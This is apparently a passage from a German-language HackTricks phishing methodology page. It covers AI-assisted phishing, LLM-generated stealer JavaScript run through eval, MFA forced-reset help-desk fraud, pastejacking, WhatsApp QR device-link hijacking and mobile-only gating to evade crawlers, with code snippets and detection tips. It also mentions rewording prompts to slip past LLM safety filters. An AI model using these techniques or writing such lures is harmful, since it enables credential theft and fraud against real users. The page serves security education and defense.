* Dadurch bleibt die C2-Flexibilität erhalten (der Server kann Tasks austauschen, ohne die DLL zu aktualisieren), und Konsolenfenster werden verborgen. Suchen Sie nach PowerShell-Kindprozessen von `rundll32.exe`, bei denen `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` gemeinsam verwendet werden.
* Defender können nach HTTP(S)-Callbacks der Form `...page.php?tynor=<COMPUTER>sss<USER>` und 5-minütigen Abfrageintervallen nach dem Laden der DLL suchen.

---

## KI-gestützte Phishing-Operationen
Angreifer verknüpfen nun **LLM- und Voice-Clone-APIs** für vollständig personalisierte Köder und Interaktionen in Echtzeit.

| Ebene | Beispielhafte Verwendung durch den Threat Actor |
|-------|---------------------------------------------|
|Automation|Mehr als 100.000 E-Mails / SMS mit variierenden Formulierungen und Tracking-Links generieren und versenden.|
|Generative AI|*Einmalige* E-Mails erstellen, die auf öffentliche M&A und Insider-Witze aus sozialen Medien Bezug nehmen; Deepfake-Stimme eines CEO bei einem Rückruf-Betrug einsetzen.|
|Agentic AI|Autonom Domains registrieren, Open-Source-Informationen sammeln und Folgemails erstellen, wenn ein Opfer klickt, aber keine Zugangsdaten übermittelt.|

**Abwehr:**
• **Dynamische Banner** hinzufügen, die Nachrichten hervorheben, die von nicht vertrauenswürdiger Automation versendet wurden (über ARC-/DKIM-Anomalien).
• **Challenge-Phrasen mit Sprachbiometrie** für risikoreiche telefonische Anfragen einsetzen.
• KI-generierte Köder kontinuierlich in Awareness-Programmen simulieren – statische Templates sind überholt.

Siehe auch – Missbrauch von agentic browsing für Credential-Phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – Missbrauch von AI agents lokaler CLI-Tools und MCP (für Secrets-Inventarisierung und Erkennung):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-gestützte Laufzeitgenerierung von Phishing-JavaScript (Codegenerierung im Browser)

Angreifer können harmlos aussehendes HTML ausliefern und den Stealer **zur Laufzeit generieren**, indem sie eine **vertrauenswürdige LLM-API** um JavaScript bitten und dieses anschließend im Browser ausführen (z. B. über `eval` oder ein dynamisches `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt als Obfuscation:** Exfil-URLs/Base64-Strings im Prompt codieren; die Formulierung iterieren, um Safety-Filter zu umgehen und Halluzinationen zu reduzieren.
2. **Clientseitiger API-Aufruf:** Beim Laden ruft JavaScript ein öffentliches LLM (Gemini/DeepSeek/usw.) oder einen CDN-Proxy auf; im statischen HTML befinden sich nur der Prompt/API-Aufruf.
3. **Zusammensetzen und Ausführen:** Die Response verketten und ausführen (polymorph pro Besuch):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** Der generierte Code personalisiert den Köder (z. B. das Parsen von LogoKit-Tokens) und sendet Zugangsdaten an den im Prompt verborgenen Endpunkt.

**Evasion-Merkmale**
- Der Traffic erreicht bekannte LLM-Domains oder seriöse CDN-Proxies, manchmal über WebSockets zu einem Backend.
- Es gibt keine statische Payload; bösartiges JS existiert erst nach dem Rendern.
- Nichtdeterministische Generierungen erzeugen pro Session **einzigartige Stealer**.

**Erkennungsideen**
- Sandboxes mit aktiviertem JS ausführen; **Laufzeit-`eval`/dynamische Skripterstellung aus LLM-Antworten** markieren.
- Nach Frontend-POSTs an LLM-APIs suchen, auf die unmittelbar `eval`/`Function` auf dem zurückgegebenen Text folgt.
- Bei nicht autorisierten LLM-Domains im Client-Traffic und anschließenden Credential-POSTs alarmieren.

---

## MFA Fatigue / Push Bombing-Variante – Erzwungener Reset
Neben klassischem Push-Bombing erzwingen Angreifer während des Helpdesk-Anrufs einfach **eine neue MFA-Registrierung** und machen dadurch das bestehende Token des Benutzers ungültig. Jede anschließende Login-Aufforderung erscheint dem Opfer legitim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Überwache AzureAD-/AWS-/Okta-Ereignisse, bei denen **`deleteMFA` + `addMFA`** innerhalb weniger Minuten von derselben IP-Adresse aus auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können schädliche Befehle unbemerkt aus einer kompromittierten oder typosquatteten Webseite in die Zwischenablage des Opfers kopieren und den Benutzer anschließend dazu bringen, sie in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen. Dadurch wird beliebiger Code ohne Download oder Anhang ausgeführt.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Eine Köderseite (z. B. ein gefälschter „Kanal“ eines Ministeriums oder CERT) zeigt einen WhatsApp-Web/Desktop-QR-Code an und weist das Opfer an, ihn zu scannen, wodurch der Angreifer unbemerkt als **linked device** hinzugefügt wird.<sup>[[12]](#references)</sup>
* Der Angreifer erhält sofort Einblick in Chats und Kontakte, bis die Sitzung entfernt wird. Opfer sehen möglicherweise später eine Benachrichtigung über ein „neues verknüpftes Gerät“. Verteidiger können nach unerwarteten **device-link**-Ereignissen kurz nach dem Besuch nicht vertrauenswürdiger QR-Seiten suchen.

### Mobile‑gated phishing to evade crawlers/sandboxes
Betreiber schalten ihre Phishing-Abläufe zunehmend hinter einer einfachen Geräteprüfung, sodass Desktop-Crawler die abschließenden Seiten nie erreichen. Ein häufiges Muster ist ein kleines Script, das prüft, ob das DOM Touch-Eingaben unterstützt, und das Ergebnis an einen Server-Endpunkt sendet. Nicht mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobilen Benutzern der vollständige Ablauf bereitgestellt wird.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
Logik von `detect_device.js` (vereinfacht):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Serververhalten, das häufig beobachtet wird:
- Setzt beim ersten Laden ein Sitzungscookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei nachfolgenden GETs `500` (oder einen Platzhalter) zurück, wenn `is_mobile=false` ist; stellt Phishing nur bereit, wenn `true` ist.

Heuristiken für die Suche und Erkennung:
- urlscan-Abfrage: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Sequenz aus `GET /static/detect_device.js` → `POST /detect` → HTTP 500 für nicht-mobile Clients; legitime Pfade für mobile Opfer geben 200 mit nachfolgendem HTML/JS zurück.
- Seiten blockieren oder genau prüfen, deren Inhalte ausschließlich von `ontouchstart` oder ähnlichen Geräteprüfungen abhängig sind.

Tipps zur Abwehr:
- Crawler mit mobilen Fingerprints und aktiviertem JS ausführen, um eingeschleuste Inhalte sichtbar zu machen.
- Bei neu registrierten Domains auf verdächtige 500-Antworten nach `POST /detect` aufmerksam machen.

## References

- [1] [Generieren von Domainvarianten für Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing finden: Tools und Techniken (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Zugangsdaten stehlen und 2FA mit noVNC umgehen (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Sitzungen stehlen und 2FA mit EvilnoVNC umgehen (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [DKIM mit Postfix unter Debian Wheezy installieren und konfigurieren (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globaler Incident-Response-Bericht 2025 von Unit 42 – Ausgabe Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gesteuerte Phishing-Infrastruktur und Heuristiken (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die nächste Grenze von Runtime-Assembly-Angriffen: Einsatz von LLMs zur Echtzeitgenerierung von Phishing-JavaScript](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking und TDS: Einblicke in ein Malware-Verteilungsökosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Traffic zu Microsofts windows.com durch Bitflipping kapern (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liebe? Eigentlich: Gefälschte Dating-App als Köder in gezielter Spyware-Kampagne in Pakistan eingesetzt](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs und Samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
